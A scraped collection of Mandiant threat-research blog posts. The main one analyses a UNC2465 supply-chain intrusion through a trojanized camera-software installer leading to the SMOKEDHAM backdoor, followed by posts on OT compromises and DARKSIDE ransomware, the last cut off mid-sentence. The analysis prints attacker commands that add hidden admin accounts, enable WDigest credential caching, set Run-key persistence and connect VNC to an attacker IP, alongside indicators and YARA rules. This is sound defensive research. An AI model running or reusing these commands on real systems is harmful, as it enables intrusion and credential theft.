evidence suggesting that the operators of the DARKSIDE service have resumed operations, we anticipate that at least some of the former affiliates of the DARKSIDE service will likely identify different ransomware or malware offerings to use within their own operations. Notably, Mandiant has continued to observe a steady increase in the number of publicly named victims on ransomware shaming sites within the past month. Despite the recent ban of ransomware-related posts within underground forums, threat actors can still leverage private chats and connections to identify ransomware services. As one example, in mid-May 2021, the operator of the SODINOKIBI (aka REvil) RaaS indicated that multiple affiliates from other RaaS platforms that had shut down were switching to their service. Based on the perceived profitability of these operations, it is almost certain that numerous threat actors will continue to conduct widespread ransomware operations for the foreseeable future. Background In June 2021, Mandiant Consulting was engaged to respond to an intrusion. During analysis, Mandiant determined the initial vector was a trojanized security camera PVR installer from a legitimate website. Mandiant attributed the overall intrusion activity to DARKSIDE affiliate UNC2465 due to continued use of infrastructure and tooling since October 2020. On May 18, 2021, a user in the affected organization browsed to the Trojanized link and downloaded the ZIP. Upon installing the software, a chain of downloads and scripts were executed, leading to SMOKEDHAM and later NGROK on the victim’s computer. Additional malware use such as BEACON, and lateral movement also occurred. Mandiant believes the Trojanized software was available from May 18, 2021, through June 8, 2021. Pivoting on the slightly modified, but benign, MSHTA.exe application in VirusTotal, Mandiant identified a second installer package with the MD5 hash, e9ed774517e129a170cdb856bd13e7e8 (SVStation_Win64-B1130.1.0.0.exe), from May 26, 2021, which also connects out the same URL as the Trojanized SmartPSS installer. Supply Chain Intrusion Cycle Figure 1: Intrusion cycle Phase 1: Trojanized Installer Download Mandiant Consulting observed the Trojanized installer downloaded on a Windows workstation after the user visited a legitimate site that the victim organization had used before. The downloaded file was extracted to C:\\Users\\[username]\\Downloads\\06212019-General-SMARTPSS-Win32-ChnEng-IS\\General_SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023\\SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023-General-v1.exe. Mandiant confirmed the user intended to download, install, and use the SmartPSS software. Figure 2 shows an image of the download page used for SmartPSS software. Figure 2: SmartPSS download page Phase 2: Nullsoft Installer The installer executable is a Nullsoft installer that when executed wrote two files to C:\\ProgramData\\SMARTPSS-Win32_ChnEng_IS. We were able to extract the malicious installer script and files for analysis using 7-Zip. The relevant section of this installer script is shown below in Figure 3. Figure 3: Nullsoft installer script section The installer script created two files: SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023-General.exe (b540b8a341c20dced4bad4e568b4cbf9) and smartpss.exe (c180f493ce2e609c92f4a66de9f02ed6). The former is a clean installer from the original developer and is launched first, installing the software as the user may expect. The latter is launched with a command line URL executing the content. The smartpss.exe file contained metadata describing itself as MSHTA.exe from Microsoft, a legitimate operating system component, but the MD5 hash was unknown. Disassembly analysis of the program showed it was a small application that loaded the IE COM object and launched the function RunHTMLApplication() against the command line argument provided. This functionality matched the behavior of the legitimate MSHTA.exe despite the hash discrepancy. Further analysis showed that the malware was based on a 2018 version of the binary (original hash: 5ced5d5b469724d9992f5e8117ecefb5) with only six bytes of data appended, as shown in Figure 4. Figure 4: CyberChef diff between MSHTA.exe and smartpss.exe Phase 3: Downloaded VBScript and PowerShell Upon execution, the modified Mshta file was executed with the URL, hxxp://sdoc[.]xyz/ID-508260156241, and passed as an argument on the command line. Domain sdoc[.]xyz was first associated with UNC2465 by RiskIQ in a May 20, 2021, blog post researching the infrastructure that Mandiant previously reported. According to RiskIQ, sdoc[.]xyz shares a registrant with koliz[.]xyz, which was also observed by Mandiant in past UNC2465 intrusions. C:\\PROGRAMDATA\\SMARTPSS-Win32_ChnEng_IS\\smartpss.exe hxxp://sdoc[.]xyz/ID-508260156241 The execution of the modified Mshta file resulted in the creation of a HTM file called loubSi78Vgb9[1].htm that was written to a temporary INetCache directory. Mandiant was not able to acquire this file at the time of writing; however, Mandiant was able to recover partial contents of the file. <html><head>..<script language='VBScript'>..On Error Resume Next At the time of writing, sdoc[.]xyz appeared to be active, but not returning the VBScript code. It is not clear if sdoc[.]xyz was selecting victims based on IP or other properties or was simply dormant. A PCAP from a sandbox execution on VirusTotal from May 26, 2021, also showed benign content being served. Figure 5: PCAP from e9ed774517e129a170cdb856bd13e7e8 VirusTotal results not returning malicious content Shortly after the download, a PowerShell script block was executed to download SMOKEDHAM, as shown in Figure 6. Figure 6: SMOKEDHAM downloader Within seconds, a file named qnxfhfim.cmdline was written to disk and executed using the Command-Line Compiler. csc.exe /noconfig /fullpaths @'C:\\Users\\ [username]\\AppData\\Local\\Temp\\qnxfhfim\\qnxfhfim.cmdline' Mandiant was not able to recover this file at the time of writing; however, Mandiant was able to recover partial contents of the file. .../t:library /utf8output /R:'System.dll' /R:'C:\\windows\\Microso After the execution of qnxfhfim.cmdline, PowerShell initiated the first connection to the fronted domain lumiahelptipsmscdnqa[.]microsoft[.]com used by SMOKEDHAM. Phase 4: SMOKEDHAM Dropper The SMOKEDHAM dropper (f075c2894ac84df4805e8ccf6491a4f4) is written in PowerShell and decrypts and executes in memory the SMOKEDHAM backdoor. The dropper uses the Add-Type cmdlet to define a new .NET class for the backdoor. The Add-Type cmdlet can be used to define a new .NET class using an existing assembly or source code files or specifying source code inline or saved in a variable. In this case, the dropper uses SMOKEDHAM backdoor source code that is stored in a variable. The SMOKEDHAM backdoor source code is embedded as an encrypted string. The dropper uses the ConvertTo-SecureString cmdlet and an embedded key to decrypt the source code prior to executing the Add-Type cmdlet. After defining a new .NET class for the backdoor, the dropper executes the backdoor's entry point. The dropper configures the backdoor with a C2 server address, RC4 encryption key, and sleep interval. Figure 7 shows the deobfuscated SMOKEDHAM dropper. Figure 7: SMOKEDHAM dropper Phase 5: SMOKEDHAM Backdoor SMOKEDHAM (127bf1d43313736c52172f8dc6513f56) is a .NET-based backdoor that supports commands, including screen capture and keystroke capture. The backdoor may also download and execute additional PowerShell commands from its command and control (C2) server. SMOKEDHAM Network Communications SMOKEDHAM communicates with its C2 server using HTTPS. The backdoor uses domain fronting to obfuscate its true C2 server. The fronted domain is configured by an earlier stage of execution and the actual domain is hard-coded in the backdoor. Mandiant observed the fronted domain lumiahelptipsmscdnqa.microsoft[.]com and hard-coded domain max-ghoster1.azureedge[.]net used for C2 server communication. The communication between SMOKEDHAM and its C2 server consists of JSON data exchanged via HTTP POST requests. The backdoor initiates requests to the C2 server and the C2 server may include commands to execute in the responses. The JSON data exchanged between SMOKEDHAM and its C2 server contains three fields: ID, UUID, and Data. The ID field contains a unique value generated by the backdoor for the target system. The UUID field may contain a unique value used to track command output or be empty. When the C2 server responds with a command to execute, it sets the UUID field to a unique value. SMOKEDHAM then sets the same UUID value in the subsequent HTTP POST request that contains the command output. The Data field may contain RC4-encrypted, Base64-encoded command data or be empty. The backdoor uses the Data field to send command output to its C2 server. The C2 server uses the Data field to send commands to the backdoor to execute. The backdoor uses an RC4 key configured by an earlier stage of execution to encrypt and decrypt the Data field. Mandiant observed the RC4 key UwOdHsFXjdCOIrjTCfnblwEZ used for RC4 encryption and decryption. SMOKEDHAM Commands SMOKEDHAM Base64-decodes, and RC4-decrypts command data returned in the Data field. The backdoor checks if the plaintext command data begins with one of the following keywords, shown in Table 1. Keyword Action delay Update its sleep interval screenshot Upload a screen capture to its C2 server via a subsequent HTTP POST request exit Terminate Table 1: Plaintext command data keywords If the plaintext command data does not begin with any of the keywords listed in Table 1, then SMOKEDHAM assumes the data contains a PowerShell command and attempts to execute it. The backdoor uploads output generated by the PowerShell command to its C2 server via a subsequent HTTP POST request. In addition to supporting the commands in Table 1, SMOKEDHAM continuously captures keystrokes. The backdoor writes captured keystrokes to memory and uploads them to its C2 server every five seconds via HTTP POST requests. SMOKEDHAM In Action SMOKEDHAM was observed executing commands on the target system using PowerShell. The following commands were used to collect information about the system and logged in users. net.exe user net.exe users whoami.exe whoami.exe /priv systeminfo.exe The following commands were used to create and add the DefaultUser account to the local Administrators group, and subsequently hide the account from the Windows logon screen. net.exe user DefaultUser REDACTED /ADD net.exe localgroup Administrators DefaultUser /ADD reg.exe ADD 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList' /v DefaultUser /t REG_DWORD /d 0 /f The following commands facilitated lateral movement by modifying Terminal Server registry key values to enable multiple Remote Desktop connection sessions, and modifying the Local Security Authority (LSA) registry key value to require a password for authentication. reg.exe ADD 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f reg.exe ADD 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' /v fSingleSessionPerUser /t REG_DWORD /d 0 /f reg.exe ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v LimitBlankPasswordUse /t REG_DWORD /d 1 /f Additionally, SMOKEDHAM modified the WDigest registry key value HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential to enable credential caching. Phase 6: Follow-on Activity SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download the UltraVNC application renamed as winvnc.exe, and a configuration file named UltraVNC.ini, shown in Figure 8. These files were saved to the %APPDATA%\\Chrome\\ directory. The UltraVNC.ini file allowed UltraVNC to connect to port 6300 on the loopback address specified by the parameter AllowLoopback=1. Figure 8: Contents of UltraVNC.ini SMOKEDHAM was observed using UltraVNC to establish a connection to the IP address and port pair 81.91.177[.]54[:]7234 that has been observed in past UNC2465 intrusions. %APPDATA%\\Chrome\\winvnc.exe' -autoreconnect ID:15000151 -connect 81.91.177[.]54[:]7234 –run SMOKEDHAM created a persistence mechanism for UltraVNC by adding the application to the ConhostNT value under the current users Run registry key. reg.exe add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ConhostNT /d %appdata%\\Chrome\\winvnc.exe NGROK Configuration SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download an NGROK utility that was renamed conhost.exe, and a script named VirtualHost.vbs that was used to execute NGROK with a configuration file named ngrok.yml. These files were stored in the C:\\ProgramData\\WindNT\\ directory. NGROK is a publicly available utility that can expose local servers behind NATs and firewalls to the public internet over secure tunnels. Figure 9 and Figure 10 show the contents of VirtualHost.vbs and ngrok.yml files, respectively. Figure 9: Contents of VirtualHost.vbs Figure 10: Contents of ngrok.yml The execution of VirtualHost.vbs allowed NGROK to listen and forward traffic on TCP port 6300 through an NGROK tunnel, subsequently allowing NGROK to tunnel UltraVNC traffic out of the environment. SMOKEDHAM created a persistence mechanism for NGROK by adding VirtualHost.vbs to the WindNT value under the current users Run registry key. reg.exe add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindNT /d C:\\ProgramData\\WindNT\\VirtualHost.vbs Keylogger Deployment This attacker utilized an additional keylogging utility named C:\\ProgramData\\psh\\console.exe. The keylogging utility was configured to capture and record keystrokes to C:\\ProgramData\\psh\\System32Log.txt. Mandiant then observed the attacker use UltraVNC to download two LNK files that reference the keylogging utility. The downloaded files were named desktop.lnk and console.lnk, respectively, and were placed in the following persistence locations: C:\\Users\\[username]\\Start Menu\\Programs\\Startup\\desktop.lnk %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\desktop.lnk %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\console.lnk Cobalt Strike Beacon The attacker used UltraVNC to download an in-memory dropper for Cobalt Strike to C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe. Update.exe was a Go based dropper created using the ScareCrow framework. The attacker executed C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe using Command Prompt. cmd.exe /c 'C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe'&&exit The execution of ScareCrow framework dropper C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe resulted in the creation of a Cobalt Strike stageless payload to C:\\ProgramData\\Cisco\\update.exe, which then established a connection to a Cobalt Strike Beacon server located at w2doger[.]xyz when executed. Mandiant observed the attacker using UltraVNC to download and store a file named update.lnk in the %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ directory. Mandiant was not able to recover update.lnk at the time of writing, but suspects that this file was created to add persistence to the Cobalt Strike stageless payload. LSASS Dumping and Lateral Movement Mandiant observed this attacker dump the LSASS process using Task Manager to a file named lsass.DMP, and later, zip the dump into two files named lsass.zip and lsass2.zip located in the C:\\ProgramData\\psh\\ directory. From this point, the attacker was observed moving laterally to different systems in the environment using Remote Desktop Protocol (RDP) connections. Conclusion UNC2465 established initial access via a Trojanized installer executed by an unsuspecting user. UNC2465 interactively established an NGROK tunnel and began moving laterally in less than 24 hours. Five days later, UNC2465 returned and deployed additional tools such as a keylogger, Cobalt Strike BEACON, and conducted credential harvesting via dumping LSASS memory. Ransomware groups continue to adapt and pursue opportunistic access to victims. UNC2465’s move from drive-by attacks on website visitors or phishing emails to this software supply chain attack shows a concerning shift that presents new challenges for detection. While many organizations are now focusing more on perimeter defenses and two-factor authentication after recent public examples of password reuse or VPN appliance exploitation, monitoring on endpoints is often overlooked or left to traditional antivirus. A well-rounded security program is essential to mitigate risk from sophisticated groups such as UNC2465 as they continue to adapt to a changing security landscape. Indicators Supply Chain/Trojanized Nullsoft Installer/SmartPSS MD5: 1430291f2db13c3d94181ada91681408 Filename: SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023-General-v1.exe Zip MD5: 54e0a0d398314f330dfab6cd55d95f38 Supply Chain/Trojanized Nullsoft Installer/SVStation MD5: e9ed774517e129a170cdb856bd13e7e8 Filename: SVStation_Win64-B1130.1.0.0.exe Intermediate Stage URL: hxxp://sdoc[.]xyz/ID-508260156241 IP: 185.92.151[.]150 SMOKEDHAM LOADER MD5: f075c2894ac84df4805e8ccf6491a4f4 (Gbdh7yghJgbj3bb.html) MD5: 05d38c7e957092f7d0ebfc7bf1eb5365 SMOKEDHAM MD5: 127bf1d43313736c52172f8dc6513f56 (in-memory from f075c2894ac84df4805e8ccf6491a4f4) Host: max-ghoster1.azureedge[.]net (actual C2) MD5: 9de326bf37270776b78e30d442bda48b (MEtNOcyfkXWe.html) Host: atlant20.azureedge[.]net (actual C2) MD5: b06319542cab55346776f0358a61b3b3 (in-memory from 05d38c7e957092f7d0ebfc7bf1eb5365) Host: skolibri13.azureedge[.]net (actual C2) NGROK MD5: e3bc4dd84f7a24f24d790cc289e0a10f (legitimate NGROK renamed to conhost.exe) MD5: 84ed6012ec62b0bddcd18058a8ff7ddd (VirtualHost.vbs) UltraVNC IP/Port: 81.91.177[.]54:7234 (using legitimate ULTRAVNC 23b89bf2c2b99fbc1e232b4f86af65f4) BEACON Host: w2doger[.]xyz IP: 185.231.68.102 MD5: a9fa3eba3f644ba352462b904dfbcc1a (shellcode) Detecting the Techniques FireEye detects this activity across our platforms. The following contains specific detection names that provide indicators associated with this activity. Platform Detection Name FireEye Network Security FireEye Email Security FireEye Detection On Demand FireEye Malware Analysis FireEye Malware File Protect Backdoor.BEACON FE_Loader_Win32_BLUESPINE_1 Trojan.Win32.CobaltStrike Backdoor.MSIL.SMOKEDHAM Malware.Binary.ps1 FEC_Backdoor_CS_SMOKEDHAM_1 Suspicious Process PowerShell Activity FireEye Endpoint Security Real-Time Detection (IOC) WDIGEST CREDENTIAL EXPOSURE (METHODOLOGY) WDIGEST CREDENTIAL EXPOSURE VIA REGISTRY (METHODOLOGY) SUSPICIOUS CONHOST.EXE A (METHODOLOGY) TASKMGR PROCESS DUMP OF LSASS.EXE A (METHODOLOGY) Malware Protection (AV/MG) Trojan.GenericFCA.Script.533 Trojan.GenericFCA.Agent.7732 Dropped:Trojan.VBS.VGU Trojan.CobaltStrike.FM NGRok Ultra VNC SVN Station Generic.mg.a9fa3eba3f644ba3 Generic.mg.1626373508569884 Modules Process Guard (LSASS memory protection) FireEye Helix VNC METHODOLOGY [Procs] (T1021.005) WINDOWS ANALYTICS [Abnormal RDP Logon] (T1078) WINDOWS ANALYTICS [Recon Commands] (T1204) WINDOWS METHODOLOGY [Cleartext Credentials Enabled - UseLogonCredential] (T1003.001) WINDOWS METHODOLOGY [LSASS Generic Dump Activity] (T1003.001) WINDOWS METHODOLOGY [LSASS Memory Access] (T1003.001) WINDOWS METHODOLOGY [Registry Run Key - reg.exe] (T1547.001) WINDOWS METHODOLOGY [User Created - Net Command] (T1136.001) Yara Detections rule Backdoor_Win_SMOKEDHAM { meta: author = \"Mandiant\" date_created = \"2021-06-10\" md5 = \"9de326bf37270776b78e30d442bda48b\" strings: $C2Method = { 2E 4D 65 74 68 6F 64 20 3D 20 22 50 4F 53 54 22 } //.Method = \"POST\" $domainFrontingDomain = /\\.[hH]ost\\s*=\\s*\\\"[^\\\"]*\";/ $envCollection1 = { 45 6E 76 69 72 6F 6E 6D 65 6E 74 2E 47 65 74 45 6E 76 69 72 6F 6E 6D 65 6E 74 56 61 72 69 61 62 6C 65 28 22 43 4F 4D 50 55 54 45 52 4E 41 4D 45 22 29 } //Environment.GetEnvironmentVariable(\"COMPUTERNAME\") $envCollection2 = { 45 6E 76 69 72 6F 6E 6D 65 6E 74 2E 47 65 74 45 6E 76 69 72 6F 6E 6D 65 6E 74 56 61 72 69 61 62 6C 65 28 22 55 53 45 52 44 4F 4D 41 49 4E 22 29 } //Environment.GetEnvironmentVariable(\"USERDOMAIN\") $envCollection3 = { 45 6E 76 69 72 6F 6E 6D 65 6E 74 2E 47 65 74 45 6E 76 69 72 6F 6E 6D 65 6E 74 56 61 72 69 61 62 6C 65 28 22 55 53 45 52 4E 41 4D 45 22 29 } //Environment.GetEnvironmentVariable(\"USERNAME\") $functionalityString1 = { 28 22 64 65 6C 61 79 22 29 } //(\"delay\") $functionalityString2 = { 28 22 73 63 72 65 65 6E 73 68 6F 74 22 29 } //(\"screenshot\") $functionalityString3 = { 28 22 65 78 69 74 22 29 } //(\"exit\") $publicStrings1 = \"public string UUID\" $publicStrings2 = \"public string ID\" $publicStrings3 = \"public string Data\" $UserAgentRequest = { 20 3D 20 45 6E 76 69 72 6F 6E 6D 65 6E 74 2E 4F 53 56 65 72 73 69 6F 6E 2E 54 6F 53 74 72 69 6E 67 28 29 3B } // = Environment.OSVersion.ToString(); condition: filesize < 1MB and all of them } rule Loader_Win_SMOKEDHAM { meta: author = \"Mandiant\" date_created = \"2021-06-10\" md5 = \"05d38c7e957092f7d0ebfc7bf1eb5365\" strings: $listedDLLs1 = \"System.Drawing.dll\" fullword $listedDLLs2 = \"System.Web.Extensions.dll\" fullword $listedDLLs3 = \"System.Windows.Forms.dll\" fullword $CSharpLang = {2d 4c 61 6e 67 75 61 67 65 20 43 53 68 61 72 70} // -Language CSharp $StringConversion = \"convertto-securestring\" nocase $SecureString1 = {5b 53 79 73 74 65 6d 2e 52 75 6e 74 69 6d 65 2e 49 6e 74 65 72 6f 70 53 65 72 76 69 63 65 73 2e 4d 61 72 73 68 61 6c 5d 3a 3a 53 65 63 75 72 65 53 74 72 69 6e 67 54 6f 42 53 54 52} //[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR $SecureString2 = {5b 53 79 73 74 65 6d 2e 52 75 6e 74 69 6d 65 2e 49 6e 74 65 72 6f 70 53 65 72 76 69 63 65 73 2e 4d 61 72 73 68 61 6c 5d 3a 3a 50 74 72 54 6f 53 74 72 69 6e 67 41 75 74 6f} //[System.Runtime.InteropServices.Marshal]::PtrToStringAuto condition: filesize < 1MB and (1 of ($listedDLLs*)) and $CSharpLang and $StringConversion and $SecureString1 and $SecureString2 } MITRE ATT&CK UNC2465 Tactic Description Initial Access T1189: Drive-by Compromise T1195.002: Compromise Software Supply Chain T1566: Phishing Execution T1053.005: Scheduled Task T1059.001: PowerShell T1059.005: Visual Basic Persistence T1098: Account Manipulation T1136: Create Account T1547.001: Registry Run Keys / Startup Folder T1547.004: Winlogon Helper DLL T1547.009: Shortcut Modification Defense Evasion T1027: Obfuscated Files or Information T1070.006: Timestomp T1112: Modify Registry T1140: Deobfuscate/Decode Files or Information T1218.005: Mshta T1553.002: Code Signing T1562.004: Disable or Modify System Firewall Discovery T1012: Query Registry T1033: System Owner/User Discovery T1082: System Information Discovery Collection T1056.001: Keylogging T1113: Screen Capture T1560: Archive Collected Data Impact T1486: Data Encrypted for Impact T1531: Account Access Removal Command and Control T1071.001: Web Protocols T1090.004: Domain Fronting T1102: Web Service T1105: Ingress Tool Transfer T1219: Remote Access Software T1572: Protocol Tunneling T1573.002: Asymmetric Cryptography Lateral Movement T1021.004: SSH T1021.005: VNC Credential Access T1003.001: LSASS Memory Resource Development T1588.003: Code Signing Certificates T1588.004: Digital Certificates T1608.003: Install Digital Certificate Acknowledgements Thanks to everyone that contributed analysis and review. Special thanks to Alison Stailey, Joseph Reyes, Nick Richard, Andrew Thompson, Jeremy Kennelly, Joshua Sablatura, Evan Reese, Van Ta, Stephen Eckels, and Tufail Ahmed. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/05/increasing-low-sophistication-operational-technology-compromises.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-05-25",
                    "source": "www.fireeye.com"
                },
                "text": "Attacks on control processes supported by operational technology (OT) are often perceived as necessarily complex. This is because disrupting or modifying a control process to cause a predictable effect is often quite difficult and can require a lot of time and resources. However, Mandiant Threat Intelligence has observed simpler attacks, where actors with varying levels of skill and resources use common IT tools and techniques to gain access to and interact with exposed OT systems. The activity is typically not sophisticated and is normally not targeted against specific organizations. Rather, the compromises appear to be driven by threat actors who are motivated to achieve ideological, egotistical, or financial objectives by taking advantage of an ample supply of internet-connected OT systems. As the actors are not interested in causing specific physical outcomes, they target whatever is available on the internet. Mandiant has observed an increase in compromises of internet-accessible OT assets over the past several years. In this blog post we discuss previously undisclosed compromises and place them in context alongside publicly known incidents. Although none of these incidents have appeared to significantly impact the physical world, their increasing frequency and relative severity calls for analysis on their possible risks and implications. Visit our website to learn more about Mandiant’s OT security practice or contact us directly to request Mandiant services or threat intelligence . Compromises of Internet-Exposed OT Are Increasing in Frequency While Mandiant has monitored threat actors claiming to share or sell access to internet-exposed OT systems since at least 2012, we have seen a significant increase in the frequency and relative severity of incidents in the past few years. The most common activity we observe involves actors trying to make money off exposed OT systems, but we also see actors simply sharing knowledge and expertise. More recently, we have observed more low sophistication threat activity leveraging broadly known tactics, techniques, and procedures (TTPs), and commodity tools to access, interact with, or gather information from internet exposed assets—something we had seen very little of in the past. This low sophistication threat activity has impacted a variety of targets across different industries, ranging from solar energy panels and water control systems, to building automation systems (BAS) and home security systems in academic and private residences. While some critical infrastructure targets are very sensitive in nature, other targets present very little risk. The following timeline presents a selection of some public and previously undisclosed OT compromises Mandiant observed between 2020 and early 2021. We note that, although it is possible many of these incidents involved process interaction, high confidence validation is not feasible as most often the evidence is provided by the actor itself. Figure 1: Selection of notable low sophistication OT compromises: January 2020 to April 2021 Low Sophistication OT Threat Activity Can Take Many Forms A consistent characteristic we observe among low sophisticated compromises is that actors most often exploit unsecure remote access services, such as virtual network computing (VNC) connections, to remotely access the compromised control systems. Graphical user interfaces (GUI), such as human machine interfaces (HMI), become the low-hanging fruit of process-oriented OT attacks as they provide a user-friendly representation of complex industrial processes, which enables actors to modify control variables without prior knowledge of a process. In many cases, the actors showed evidence of compromised control processes via images of GUIs, IP addresses, system timestamps, and videos. Low Sophistication Threat Actors Access HMIs and Manipulate Control Processes In March 2020, we analyzed a series of screenshots shared by a threat actor who claimed to compromise dozens of control systems across North America, Western and Central Europe, and East Asia. Based on the timestamps from the images, the actor appeared to gain unauthorized access to these assets over a five-day period. The actor also shared a low-quality cell phone video showing their explicit interaction with a Dutch-language temperature control system. While much of this type of activity appears opportunistic in nature, some may also be driven by political motivations. For example, we have seen hacktivist groups that frequently use anti-Israel/pro-Palestine rhetoric in social media posts share images indicating that they had compromised OT assets in Israel, including a solar energy asset and the webserver of a datalogger used for different applications such as mining exploration and dam surveillance (Figure 2). Figure 2: Screenshots of compromised web-interfaces supporting OT Some threat actors appear particularly eager to demonstrate their interaction with compromised control systems. One threat actor shared multiple screen recordings making arbitrary set point changes to compromised HMIs via remote connections from their own desktop. While we suspect many of the victims compromised by this threat actor were small- and medium-sized businesses, on one occasion the group appeared to have successfully accessed the BAS of a hotel in Australia belonging to a major international hotel chain (Figure 3). Figure 3: Screenshots showing a possible compromise of a hotel BAS Some Amateur Actors Show Limited OT Expertise Some of the actors we track made comments that indicated they had either a limited understanding of the OT assets they compromised or that they were simply attempting to gain notoriety. For example, one threat actor shared a screenshot of a purportedly compromised German-language rail control system. We conducted a reverse image search of the screenshot and identified the asset as the web interface for an ECoS 50210 command station designed for model train sets (Figure 4). Figure 4: “Rail control system” that was really a web-interface for a model train set Another group made a similar gaffe when they claimed to retaliate for an explosion at a missile facility in Iran by compromising an Israeli “gas system.” A video of their operation showed that they had actually compromised a kitchen ventilation system installed at a restaurant in Ramat Hasharon, Israel (Figure 5). Figure 5: “Gas system” that was really a kitchen ventilation system Low Sophistication OT Threat Activity is Supported by Hacktivist Tutorials In a few instances, actors operating as part of hacktivist collectives created and shared tutorials that instructed their affiliates and sympathetic parties on how to identify and compromise internet-accessible OT assets. The tutorials typically described simple methodologies, such as using VNC utilities to connect to IP addresses identified in Shodan or Censys searches for port 5900. These methods appear to have been used in some of the incidents we described, as some of the shared screenshots of compromised OT systems also showed the actor’s web browser tabs displaying similar Shodan queries and remote access tools. Figure 6: Hacktivist tutorial describing how to access the HMI of an industrial gas and liquid burner Low Sophistication OT Compromises Pose A Growing Risk Each of the low sophistication incidents we observe is unique and poses a different level of risk, which we normally determine by examining the actor’s previous work and reputation, the target’s industry, and the nature of the compromised process, among other things. While low sophistication incidents do not appear to commonly impact physical environments, they remain concerning for the following reasons. Each incident provides threat actors with opportunities to learn more about OT, such as the underlying technology, physical processes, and operations. These opportunities can increase an adversary's ability and enhance their tradecraft. Even low-sophistication intrusions into OT environments carry the risk of disruption to physical processes, mainly in the case of industries or organizations with less mature security practices. As the number of intrusions increase, so does the risk of process disruption. The publicity of these incidents normalizes cyber operations against OT and may encourage other threat actors to increasingly target or impact these systems. This is consistent with the increase in OT activity by more resourced financially-motivated groups and ransomware operators. Security Best Practices and Situational Awareness Help Prevent Low Sophistication Compromises Defense against low sophistication compromises is best addressed by implementing security best practices and gaining situational awareness about the threat exposure of assets and data. Implementing security controls to defend against this activity is also the foundation for mature security programs that seek to prevent and identify complex OT threats before they introduce a risk to the safety of people and infrastructure. Whenever feasible, remove OT assets from public-facing networks. If remote access is required, deploy access controls and monitor traffic for unusual activity to minimize unintended interaction and safeguard asset information. Apply common network-hardening techniques to remotely accessible and edge devices, such as disabling unused services, changing default credentials, reviewing asset configurations, and creating whitelists for access. Determine if relevant assets are discoverable using online scanners such as Shodan and Censys. Leverage support from knowledgeable security researchers to identify exposed assets and leaked information. Mandiant Threat Intelligence offers subscription content, custom analysis, and black box assessments that help organizations identify internet-exposed assets and information. Maintain situational awareness on threat actors’ interest in cyber physical systems and the development of OT exploits , with particular interest in attention driven to your organization, third party providers, or original equipment manufacturers (OEM). Configure HMIs and other control system assets to enforce acceptable input ranges and prohibit hazardous variable states. Similar to web application security, automation programmers should treat all operator input as potentially malicious and gain security assurances by validating that the operator input is within acceptable thresholds. Visit our website to learn more about Mandiant’s OT security practice or contact us directly to request Mandiant services or threat intelligence . Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/05/shining-a-light-on-darkside-ransomware-operations.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-05-11",
                    "source": "www.fireeye.com"
                },
                "text": "Update (May 14): Mandiant has observed multiple actors cite a May 13 announcement that appeared to be shared with DARKSIDE RaaS affiliates by the operators of the service. This announcement stated that they lost access to their infrastructure, including their blog, payment, and CDN servers, and would be closing their service. Decrypters would also be provided for companies who have not paid, possibly to their affiliates to distribute. The post cited law enforcement pressure and pressure from the United States for this decision. We have not independently validated these claims and there is some speculation by other actors that this could be an exit scam. Background Since initially surfacing in August 2020, the creators of DARKSIDE ransomware and their affiliates have launched a global crime spree affecting organizations in more than 15 countries and multiple industry verticals. Like many of their peers, these actors conduct multifaceted extortion where data is both exfiltrated and encrypted in place, allowing them to demand payment for unlocking and the non-release of stolen data to exert more pressure on victims. The origins of these incidents are not monolithic. DARKSIDE ransomware operates as a ransomware-as-a-service (RaaS) wherein profit is shared between its owners and partners, or affiliates, who provide access to organizations and deploy the ransomware. Mandiant currently tracks multiple threat clusters that have deployed this ransomware, which is consistent with multiple affiliates using DARKSIDE. These clusters demonstrated varying levels of technical sophistication throughout intrusions. While the threat actors commonly relied on commercially available and legitimate tools to facilitate various stages of their operations, at least one of the threat clusters also employed a now patched zero-day vulnerability. Reporting on DARKSIDE has been available in advance of this blog post to users of Mandiant Advantage Free , a no-cost version of our threat intelligence platform. Targeting Mandiant has identified multiple DARKSIDE victims through our incident response engagements and from reports on the DARKSIDE blog. Most of the victim organizations were based in the United States and span across multiple sectors, including financial services, legal, manufacturing, professional services, retail, and technology. The number of publicly named victims on the DARKSIDE blog has increased overall since August 2020, with the exception of a significant dip in the number of victims named during January 2021 (Figure 1). It is plausible that the decline in January was due to threat actors using DARKSIDE taking a break during the holiday season. The overall growth in the number of victims demonstrates the increasing use of the DARKSIDE ransomware by multiple affiliates. Figure 1: Known DARKSIDE victims (August 2020 to April 2021) DARKSIDE Ransomware Service Beginning in November 2020, the Russian-speaking actor \"darksupp\" advertised DARKSIDE RaaS on the Russian-language forums exploit.in and xss.is. In April 2021, darksupp posted an update for the \"Darkside 2.0\" RaaS that included several new features and a description of the types of partners and services they were currently seeking (Table 1). Affiliates retain a percentage of the ransom fee from each victim. Based on forum advertisements, the RaaS operators take 25% for ransom fees less than $500,000, 